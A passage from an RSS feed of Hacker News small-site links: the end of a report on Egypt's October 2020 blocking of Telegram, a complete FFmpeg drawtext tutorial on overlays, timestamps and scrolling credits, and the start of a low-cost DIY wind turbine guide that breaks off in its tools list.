<p><img loading="lazy" src="https://i0.wp.com/masaar.net/wp-content/uploads/2020/10/Untitled-1.png?resize=1024%2C512&amp;ssl=1" alt="" width="1024" height="512" srcset="https://i0.wp.com/masaar.net/wp-content/uploads/2020/10/Untitled-1.png?resize=1024%2C512&amp;ssl=1 1024w, https://i0.wp.com/masaar.net/wp-content/uploads/2020/10/Untitled-1.png?resize=300%2C150&amp;ssl=1 300w, https://i0.wp.com/masaar.net/wp-content/uploads/2020/10/Untitled-1.png?resize=768%2C384&amp;ssl=1 768w, https://i0.wp.com/masaar.net/wp-content/uploads/2020/10/Untitled-1.png?w=1200&amp;ssl=1 1200w" sizes="(max-width: 1024px) 100vw, 1024px" data-recalc-dims="1" data-lazy-srcset="https://i0.wp.com/masaar.net/wp-content/uploads/2020/10/Untitled-1.png?resize=1024%2C512&amp;ssl=1 1024w, https://i0.wp.com/masaar.net/wp-content/uploads/2020/10/Untitled-1.png?resize=300%2C150&amp;ssl=1 300w, https://i0.wp.com/masaar.net/wp-content/uploads/2020/10/Untitled-1.png?resize=768%2C384&amp;ssl=1 768w, https://i0.wp.com/masaar.net/wp-content/uploads/2020/10/Untitled-1.png?w=1200&amp;ssl=1 1200w" data-lazy-src="https://i0.wp.com/masaar.net/wp-content/uploads/2020/10/Untitled-1.png?resize=1024%2C512&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></p>
<p>Technology and Law Community “Masaar” documented the blocking of the Telegram website and application by the Egyptian authorities on 22 October 2020. The authorities blocked Telegram on three of the Internet service networks operating in Egypt. These networks included “We”, “Vodafone” and “Orange”. Masaar learned about the blocking action after complaints from several users of the Internet services on the three networks, stating that they cannot access the application or the website. It should be noted that Telegram is one of the most popular and widespread encrypted chat applications in the world.</p>
<p>Masaar confirms that users of the three networks: We (AS8452), Orange (AS24863) and Vodafone (AS36935) cannot use Telegram application on smartphones, as the Egyptian authorities have blocked access to IP addresses of the application.</p>
<p>The authorities also have blocked the Telegram website itself (telegram.org) and the version of Telegram used for desktop computers (web.telegram.org). Further, the blocking involved ADSL and mobile internet (4G / 3G).</p>
<p>It is noteworthy that last September “Masaar” had <a href="https://masaar.net/en/blocked-websites-in-egypt/">published a web page declaring that the authorities have blocked 596 websites and 32 alternative links</a> since May 2017.</p>
</div>
</div>
</article></div>]]>
            </description>
            <link>https://masaar.net/en/the-egyptian-authorities-block-telegram/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24865875</guid>
            <pubDate>Fri, 23 Oct 2020 03:48:36 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[FFmpeg Drawtext Filter for Overlays, Scrolling Text, Timestamps on Videos]]>
            </title>
            <description>
<![CDATA[
Score 175 | Comments 78 (<a href="https://news.ycombinator.com/item?id=24865755">thread link</a>) | @ponderingfish
<br/>
October 22, 2020 | https://ottverse.com/ffmpeg-drawtext-filter-dynamic-overlays-timecode-scrolling-text-credits/ | <a href="https://web.archive.org/web/*/https://ottverse.com/ffmpeg-drawtext-filter-dynamic-overlays-timecode-scrolling-text-credits/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<figure>
<img src="https://i1.wp.com/ottverse.com/wp-content/uploads/2020/10/ffmpeg-drawtext-featured-image.png?resize=678%2C381&amp;ssl=1" alt="ffmpeg-drawtext-filter-dynamic-overlays-timecode-scrolling-text-credits" title="ffmpeg-drawtext-featured-image" data-src="https://i1.wp.com/ottverse.com/wp-content/uploads/2020/10/ffmpeg-drawtext-featured-image.png?resize=678%2C381&amp;ssl=1" data-old-src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">
</figure>


<p><strong>Learn FFmpeg’s drawtext filter to dynamically overlay text on video and display information such as timecode, frame resolution, watermarks, etc. Also, let’s learn how to configure the font, font-size, position, background-color, alignment, multiple lines, etc. using FFmpeg’s drawtext filter.</strong></p>




<h2 id="step-0-ensure-your-ffmpeg-is-compiled-with-libfreetype"><span id="Step_0_Ensure_your_FFmpeg_Is_Compiled_with_libfreetype"></span>Step 0: Ensure your FFmpeg Is Compiled with libfreetype<span></span></h2>



<p>In order to use&nbsp;<code>drawtext</code>, you needed to have configured FFmpeg with&nbsp;<code>--enable-libfreetype</code>. As per the documentation, you need the following options as well if you want to,</p>



<ul><li>enable default font fallback and the font option you need to configure FFmpeg with&nbsp;<code>--enable-libfontconfig</code>.</li><li>enable the text_shaping option, you need to configure FFmpeg with&nbsp;<code>--enable-libfribidi</code>.</li></ul>



<h2 id="complete-list-of-options-for-drawtext"><span id="Complete_List_of_Options_for_drawtext"></span>Complete List of Options for drawtext<span></span></h2>



<p>The complete list of options for&nbsp;<code>drawtext</code>&nbsp;filter can be accessed&nbsp;<a href="https://ffmpeg.org/ffmpeg-filters.html#Syntax" target="_blank" rel="noopener">here</a>. It is far too much for me to explain here, but, if you have any questions, that is the first place you should refer.</p>



<p>In this article, I’ll walk through several common use-cases that should make the concepts easy to understand.</p>



<h2 id="display-text-on-the-video-using-drawtext-filter"><span id="Display_Text_on_the_Video_using_drawtext_filter"></span>Display Text on the Video using drawtext filter<span></span></h2>



<p>Here is the commandline and an explanation of the options</p>



<pre><code>ffmpeg -i inputClip.mp4 -vf "drawtext=text='My text starting at 640x360':x=640:y=360:fontsize=24:fontcolor=white" -c:a copy output.mp4</code></pre>



<p>Here,</p>



<ul><li><code>inputClip.mp4</code>&nbsp;is the input video on which you want to display the text; and the output (containing the text) is to be stored in&nbsp;<code>output.mp4</code></li><li>no audio re-encoding as indicated by&nbsp;<code>-c:a copy</code></li><li>we use the drawtext filter as indicated by the commands&nbsp;<code>-vf "drawtext=........"</code></li><li><code>text='My text starting at 640x360'</code>&nbsp;is the text that will be shown on the video (you could make it your name for watermarking the video, right?)</li><li>position of the text<ul><li><code>x=640:y=360</code>&nbsp;indicates that the x and y coordinates as&nbsp;<code>640px</code>&nbsp;and&nbsp;<code>360px</code>. Also, as a side note, the video’s resolution is&nbsp;<code>1280x720</code>.</li><li>font size is&nbsp;<code>24</code></li><li>font color is&nbsp;<code>white</code></li></ul></li></ul>



<p>Let’s see how the output looks, shall we?</p>



<div><figure><img data-attachment-id="90" data-permalink="https://ottverse.com/drawtext-filter-basic-example/" data-orig-file="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/drawtext-filter-basic-example.png?fit=960%2C538&amp;ssl=1" data-orig-size="960,538" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="drawtext-filter-basic-example" data-image-description="" data-medium-file="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/drawtext-filter-basic-example.png?fit=300%2C168&amp;ssl=1" data-large-file="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/drawtext-filter-basic-example.png?fit=960%2C538&amp;ssl=1" loading="lazy" width="960" height="538" src="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/drawtext-filter-basic-example.png?resize=960%2C538&amp;is-pending-load=1#038;ssl=1" alt="ffmpeg-drawtext-filter-dynamic-overlays-timecode-scrolling-text-credits" data-recalc-dims="1" data-lazy-srcset="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/drawtext-filter-basic-example.png?w=960&amp;ssl=1 960w, https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/drawtext-filter-basic-example.png?resize=300%2C168&amp;ssl=1 300w, https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/drawtext-filter-basic-example.png?resize=768%2C430&amp;ssl=1 768w" data-lazy-sizes="(max-width: 960px) 100vw, 960px" data-lazy-src="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/drawtext-filter-basic-example.png?resize=960%2C538&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure></div>



<p>A better way to this is to offset the text by the length of the text that you are printing on the screen.</p>



<p>Confused?</p>



<p>If you look at the image above, you’ll see that it starts at the center of the video and extends towards the right.</p>



<p><strong>If you want to center the text itself, then you can subtract the height and width of the rendered text when telling&nbsp;<code>drawtext</code>&nbsp;where to render the text.</strong></p>



<p>Here’s how. You use the command&nbsp;<code>x=(w-text_w)/2:y=(h-text_h)/2</code>&nbsp;and it will center the text. Here is our new commandline –</p>



<pre><code>ffmpeg -i inputClip.mp4 -vf "drawtext=text='Centered Text':x=(w-text_w)/2:y=(h-text_h)/2:fontsize=24:fontcolor=white" -c:a copy output.mp4</code></pre>



<p>Now, the text looks nice and pretty 🙂</p>



<div><figure><img data-attachment-id="78" data-permalink="https://ottverse.com/centered-text/" data-orig-file="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/centered-text.png?fit=960%2C536&amp;ssl=1" data-orig-size="960,536" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="centered-text" data-image-description="" data-medium-file="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/centered-text.png?fit=300%2C168&amp;ssl=1" data-large-file="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/centered-text.png?fit=960%2C536&amp;ssl=1" loading="lazy" width="960" height="536" src="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/centered-text.png?resize=960%2C536&amp;is-pending-load=1#038;ssl=1" alt="ffmpeg-drawtext-filter-dynamic-overlays-timecode-scrolling-text-credits" data-recalc-dims="1" data-lazy-srcset="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/centered-text.png?w=960&amp;ssl=1 960w, https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/centered-text.png?resize=300%2C168&amp;ssl=1 300w, https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/centered-text.png?resize=768%2C429&amp;ssl=1 768w" data-lazy-sizes="(max-width: 960px) 100vw, 960px" data-lazy-src="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/centered-text.png?resize=960%2C536&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure></div>



<p><strong>Fantastic – you now know how to overlay text onto a video using FFmpeg’s&nbsp;<code>drawtext</code>&nbsp;filter. Do you think you can add your own watermark or copyright? Let’s try 🙂</strong></p>



<h2 id="adding-a-copyright-notice-or-text-watermark-using-ffmpegs-drawtext-filter"><span id="Adding_a_Copyright_notice_or_Text_Watermark_using_FFmpeg%E2%80%99s_drawtext_filter"></span>Adding a Copyright notice or Text Watermark using FFmpeg’s drawtext filter<span></span></h2>



<p>Let’s modify the command as follows to indicate my name and the copyright symbol.</p>



<pre><code>ffmpeg -i inputClip.mp4 -vf "drawtext=text='© Krishna':x=640:y=360:fontsize=24:fontcolor=white" -c:a copy output.mp4</code></pre>



<p>This produces an output like this – looks good right? You can play around with the&nbsp;<code>x</code>&nbsp;and&nbsp;<code>y</code>&nbsp;coordinates to align the text the way you want to.</p>



<div><figure><img data-attachment-id="92" data-permalink="https://ottverse.com/drawtext-with-copyright/" data-orig-file="https://i1.wp.com/ottverse.com/wp-content/uploads/2020/10/drawtext-with-copyright.png?fit=960%2C541&amp;ssl=1" data-orig-size="960,541" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="drawtext-with-copyright" data-image-description="" data-medium-file="https://i1.wp.com/ottverse.com/wp-content/uploads/2020/10/drawtext-with-copyright.png?fit=300%2C169&amp;ssl=1" data-large-file="https://i1.wp.com/ottverse.com/wp-content/uploads/2020/10/drawtext-with-copyright.png?fit=960%2C541&amp;ssl=1" loading="lazy" width="960" height="541" src="https://i1.wp.com/ottverse.com/wp-content/uploads/2020/10/drawtext-with-copyright.png?resize=960%2C541&amp;is-pending-load=1#038;ssl=1" alt="ffmpeg-drawtext-filter-dynamic-overlays-timecode-scrolling-text-credits" data-recalc-dims="1" data-lazy-srcset="https://i1.wp.com/ottverse.com/wp-content/uploads/2020/10/drawtext-with-copyright.png?w=960&amp;ssl=1 960w, https://i1.wp.com/ottverse.com/wp-content/uploads/2020/10/drawtext-with-copyright.png?resize=300%2C169&amp;ssl=1 300w, https://i1.wp.com/ottverse.com/wp-content/uploads/2020/10/drawtext-with-copyright.png?resize=768%2C433&amp;ssl=1 768w" data-lazy-sizes="(max-width: 960px) 100vw, 960px" data-lazy-src="https://i1.wp.com/ottverse.com/wp-content/uploads/2020/10/drawtext-with-copyright.png?resize=960%2C541&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure></div>



<h2 id="adding-text-with-background-color-using-ffmpegs-drawtext-filter"><span id="Adding_Text_with_Background_Color_using_FFmpeg%E2%80%99s_drawtext_filter"></span>Adding Text with Background Color using FFmpeg’s drawtext filter<span></span></h2>



<p>To add a background color, we need</p>



<pre><code>ffmpeg -i inputClip.mp4 -vf "drawtext=text='© Krishna':x=(1100-text_w):y=(600-text_h):fontsize=32:fontcolor=black:box=1:boxcolor=white@0.5: boxborderw=5" -c:a copy output.mp4</code></pre>



<p>The new commands here are –</p>



<ul><li><code>box</code>&nbsp;: this is either&nbsp;<code>1</code>&nbsp;(enabled) or&nbsp;<code>0</code>&nbsp;(disabled)</li><li><code>boxcolor:&nbsp;white@0.5</code>&nbsp;implies a white colored box with a 50% opacity.</li><li><code>boxborderw</code>&nbsp;is the width of the box’s border and the border color is taken from&nbsp;<code>boxcolor</code>.</li></ul>



<p>And there you have it, text with a background. In this example, I switched the color of the text to black so that it contrasts well with a light background bounding box (which in-turn contrasts well with a dark background.)</p>



<div><figure><img data-attachment-id="89" data-permalink="https://ottverse.com/drawtext-box-background/" data-orig-file="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/drawtext-box-background.png?fit=960%2C538&amp;ssl=1" data-orig-size="960,538" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="drawtext-box-background" data-image-description="" data-medium-file="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/drawtext-box-background.png?fit=300%2C168&amp;ssl=1" data-large-file="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/drawtext-box-background.png?fit=960%2C538&amp;ssl=1" loading="lazy" width="960" height="538" src="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/drawtext-box-background.png?resize=960%2C538&amp;is-pending-load=1#038;ssl=1" alt="ffmpeg-drawtext-filter-dynamic-overlays-timecode-scrolling-text-credits" data-recalc-dims="1" data-lazy-srcset="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/drawtext-box-background.png?w=960&amp;ssl=1 960w, https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/drawtext-box-background.png?resize=300%2C168&amp;ssl=1 300w, https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/drawtext-box-background.png?resize=768%2C430&amp;ssl=1 768w" data-lazy-sizes="(max-width: 960px) 100vw, 960px" data-lazy-src="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/drawtext-box-background.png?resize=960%2C538&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure></div>



<h2 id="displaying-timecodes--timestamps-using--ffmpegs-drawtext-filter"><span id="Displaying_TimeCodes_/_TimeStamps_using_FFmpeg%E2%80%99s_drawtext_filter"></span>Displaying TimeCodes / TimeStamps using FFmpeg’s drawtext filter<span></span></h2>



<p>This is a very useful application of the&nbsp;<code>drawtext</code>&nbsp;filter and is used in demonstrating low-latency applications or visual quality testing so that one knows precisely what the timestamps/timecodes are at each time.</p>



<pre><code>ffmpeg -i inputClip.mp4 -vf "drawtext=text='timestamp: %{pts \: hms}': x=500: y=500: fontsize=32:fontcolor=yellow@0.9: box=1: boxcolor=black@0.6" -c:a copy output.mp4</code></pre>



<p>This uses the&nbsp;<code>timestamp</code>&nbsp;and&nbsp;<code>pts</code>&nbsp;options to display time in hour:min:sec format using the&nbsp;<code>hms</code>&nbsp;format specifier. The notations and formatting are complex in my opion! So, a lot of trial and error might be needed before you format your display correctly.</p>



<p>Here is how the video looks. Hope Vimeo shows you the video without a lot of delay 🙂</p>



<figure><div>
<p><iframe width="600" height="338" frameborder="0" webkitallowfullscreen="" mozallowfullscreen="" allowfullscreen="" data-src="https://player.vimeo.com/video/445270549" src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></iframe></p>
</div></figure>



<p>And here is the same command, but using the&nbsp;<code>flt</code>&nbsp;option to provide microsecond time accuracy! Fancy 🙂</p>



<pre><code>ffmpeg -i inputClip.mp4 -vf "drawtext=text='timestamp: %{pts \: flt}': x=500: y=500: fontsize=32:fontcolor=yellow@0.9: box=1: boxcolor=black@0.6" -c:a copy output.mp4
</code></pre>



<figure><img data-attachment-id="91" data-permalink="https://ottverse.com/drawtext-timecode-flt/" data-orig-file="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/drawtext-timecode-flt.png?fit=960%2C540&amp;ssl=1" data-orig-size="960,540" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="drawtext-timecode-flt" data-image-description="" data-medium-file="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/drawtext-timecode-flt.png?fit=300%2C169&amp;ssl=1" data-large-file="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/drawtext-timecode-flt.png?fit=960%2C540&amp;ssl=1" loading="lazy" width="960" height="540" src="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/drawtext-timecode-flt.png?resize=960%2C540&amp;is-pending-load=1#038;ssl=1" alt="ffmpeg-drawtext-filter-dynamic-overlays-timecode-scrolling-text-credits" data-recalc-dims="1" data-lazy-srcset="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/drawtext-timecode-flt.png?w=960&amp;ssl=1 960w, https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/drawtext-timecode-flt.png?resize=300%2C169&amp;ssl=1 300w, https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/drawtext-timecode-flt.png?resize=768%2C432&amp;ssl=1 768w" data-lazy-sizes="(max-width: 960px) 100vw, 960px" data-lazy-src="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/drawtext-timecode-flt.png?resize=960%2C540&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>



<h2 id="display-movie-credits-using-ffmpegs-drawtext-filter"><span id="Display_Movie_Credits_using_FFmpeg%E2%80%99s_drawtext_filter"></span>Display Movie Credits using FFmpeg’s drawtext filter<span></span></h2>



<p>Finally, let’s learn how to show a movie’s credits using the draw text filter. Here are two main concepts that you need to understand.</p>



<ul><li>providing a lot of text: you can’t do this via the commandline, so, you need to read a text file that contains the text. And you can read that using the&nbsp;<code>textfile</code>&nbsp;option.</li><li>and, specify the speed of scrolling using the&nbsp;<code>y</code>&nbsp;text position. Here, you can provide an equation instead of a constant number. You start off by telling by FFmpeg that the y-position is&nbsp;<code>h - 80*t</code>&nbsp;so that everytime the value of time increases, the value of&nbsp;<code>h - 80*t*</code>&nbsp;decreases, and the text is displayed higher. Makes sense?</li></ul>



<p><strong>Tip: change&nbsp;<code>80</code>&nbsp;to&nbsp;<code>100</code>&nbsp;or&nbsp;<code>120</code>&nbsp;and see the effect on the scrolling speed.</strong></p>



<pre><code>ffmpeg -i inputClip.mp4 -vf "drawtext=textfile=credits.txt: x=200: y=h-80*t: fontsize=36:fontcolor=yellow@0.9: box=1: boxcolor=black@0.6" -c:a copy outputCredits.mp4
</code></pre>



<p>Here is the output:</p>



<figure><div>
<p><iframe width="600" height="338" frameborder="0" webkitallowfullscreen="" mozallowfullscreen="" allowfullscreen="" data-src="https://player.vimeo.com/video/445276018" src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></iframe></p>
</div></figure>



<p>That’s it for this tutorial on using FFmpeg’s&nbsp;<code>drawtext</code>&nbsp;filter to produce dynamic overlays on your videos. It is a very versatile and handy tool that you can use to overlay text, timecodes, credits, copyrights notices on your videos.</p>







<hr>



<p>If you are interested in video compression, <a href="https://ottverse.com/lcevc-vs-avc-using-ffmpeg/">check out our comparison of LCEVC (MPEG5 Part 2) vs H.264/AVC</a>. Stunning results, I tell you 🙂 </p>



<figure><a href="https://ottverse.com/lcevc-vs-avc-using-ffmpeg/"><img data-attachment-id="1006" data-permalink="https://ottverse.com/lcevc-vs-avc-using-ffmpeg/lcevc-vs-avc-featured-image/" data-orig-file="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/lcevc-vs-avc-featured-image.png?fit=1920%2C1080&amp;ssl=1" data-orig-size="1920,1080" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="lcevc-vs-avc-featured-image" data-image-description="" data-medium-file="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/lcevc-vs-avc-featured-image.png?fit=300%2C169&amp;ssl=1" data-large-file="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/lcevc-vs-avc-featured-image.png?fit=1024%2C576&amp;ssl=1" loading="lazy" width="1024" height="576" src="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/lcevc-vs-avc-featured-image.png?resize=1024%2C576&amp;is-pending-load=1#038;ssl=1" alt="lcevc avc ffmeg" data-recalc-dims="1" data-lazy-srcset="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/lcevc-vs-avc-featured-image.png?resize=1024%2C576&amp;ssl=1 1024w, https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/lcevc-vs-avc-featured-image.png?resize=300%2C169&amp;ssl=1 300w, https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/lcevc-vs-avc-featured-image.png?resize=768%2C432&amp;ssl=1 768w, https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/lcevc-vs-avc-featured-image.png?resize=1536%2C864&amp;ssl=1 1536w, https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/lcevc-vs-avc-featured-image.png?resize=1200%2C675&amp;ssl=1 1200w, https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/lcevc-vs-avc-featured-image.png?resize=678%2C381&amp;ssl=1 678w, https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/lcevc-vs-avc-featured-image.png?w=1920&amp;ssl=1 1920w" data-lazy-sizes="(max-width: 1000px) 100vw, 1000px" data-lazy-src="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/lcevc-vs-avc-featured-image.png?resize=1024%2C576&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></a></figure>
		
		
		
	</div></div>]]>
            </description>
            <link>https://ottverse.com/ffmpeg-drawtext-filter-dynamic-overlays-timecode-scrolling-text-credits/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24865755</guid>
            <pubDate>Fri, 23 Oct 2020 03:22:33 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[$30 DIY Kilowatt Wind Turbine (2017)]]>
            </title>
            <description>
<![CDATA[
Score 178 | Comments 82 (<a href="https://news.ycombinator.com/item?id=24865731">thread link</a>) | @simonpure
<br/>
October 22, 2020 | http://opensourcelowtech.org/wind_turbine.html | <a href="https://web.archive.org/web/*/http://opensourcelowtech.org/wind_turbine.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
              <div>
                               <p>
                  Updated 24 Sept '18<br>
                  Developed by: Daniel Connell<br>
                  English Tutorial Text: Daniel Connell<br>
                  Tutorial Animation: Daniel Connell </p>
                <p><strong>Contents of this tutorial:</strong><br>
  <a href="#desc">Description</a><br>
  <a href="#tools">Tools</a><br>
<a href="#mat">Materials</a><a href="#resources"><br>
Resources</a><br>
  <a href="#steps">Step By Step Instructions<br>
</a><a href="#mount">Configurations and Applications</a></p>
<p><strong><a name="desc" id="desc"></a>Description:</strong></p><p>

  This is a Vertical Axis Wind Turbine which uses wind energy to  drive things like an alternator/generator for producing electricity,  or air and water pumps for cooling, irrigation and similar.<br>
  The  turbine uses the 35-40% mechanically efficient Lenz2 lift+drag  design. It is made almost entirely from scrap materials, and should  cost about $15-$30 for the six vane version, which can be made by two  people in four hours without much effort. <br>
The three vane  version has been successfully survival tested to 80 km/h sustained  winds and the six vane version to 105 km. Both will do more, but  exactly how much has not yet been ascertained. The current longest  running version has been up since early 2014, through reasonable  storms, with no noticeable wear and tear as of yet.</p>
<iframe width="320" height="180" src="https://www.youtube.com/embed/8oe6egO0YOc" frameborder="0" allowfullscreen=""></iframe>

<p>Full power curves have yet to be calculated for this  particular build, but according to Mr Ed Lenz's calculations a six  vane at 0.91 meters diameter and 1.1 meters high with a 90% efficient  alternator should produce at least 130 watts of electricity in a 30  km/h wind, and 1 kilowatt at 60 km/h. </p><p>
The materials  listed in this tutorial are to make the three vane version. Double  everything except the bike wheel for six vanes.
</p>
<p><strong><a name="tools" id="tools"></a>Tools:</strong></p>
        <table>
          <tbody><tr>
            <td><img src="http://opensourcelowtech.org/tutorials/icons/drill1.jpg" width="80" height="80"></td>
            <td><strong>Power drill</strong></td>
          </tr>
          <tr>
            <td><img src="http://opensourcelowtech.org/tutorials/icons/6mmbit1.jpg" width="80" height="80"></td>
            <td>
              <p><strong>Metal Drill Bits<br>
    </strong>4mm,  6mm, 10mm.</p></td>
          </tr>
          <tr>
            <td><img src="http://opensourcelowtech.org/tutorials/icons/cknife1.jpg" width="80" height="80"></td>
            <td>
            <p><strong>Craft </strong><strong>K</strong><strong>nife </strong><strong>or</strong><strong> Stanley </strong><strong>K</strong><strong>nife / </strong><strong>Box  Cutter<br>
            </strong><strong><span>The former is better for  cutting paper, the latter for scoring the aluminium sheets, so one of  each may be a good idea.</span></strong></p></td>
          </tr>
          <tr>
            <td><img src="http://opensourcelowtech.org/tutorials/icons/anglealu1.jpg" width="80" height="80"></td>
            <td><strong>20mm x 20mm angle aluminium</strong>            <br>
            About 1 meter long, an extra 30cm length is also handy. To be used for ruling and bending.</td>
          </tr>
          <tr>
            <td><img src="http://opensourcelowtech.org/tutorials/icons/tapemeasure1.jpg" width="80" height="80"></td>
            <td><strong>Tape Measure</strong></td>
          </tr>
          <tr>
            <td><img src="http://opensourcelowtech.org/tutorials/icons/riveter1.jpg" width="80" height="80"></td>
            <td><strong>Pop Riveter</strong></td>
          </tr>
          <tr>
            <td><img src="http://opensourcelowtech.org/tutorials/icons/sharpie1.jpg" width="80" height="80"></td>
            <td><p><strong>Marker Pen</strong></p></td>
          </tr>
          <tr>
            <td><img src="http://opensourcelowtech.org/tutorials/icons/stickytape1.jpg" width="80" height="80"></td>
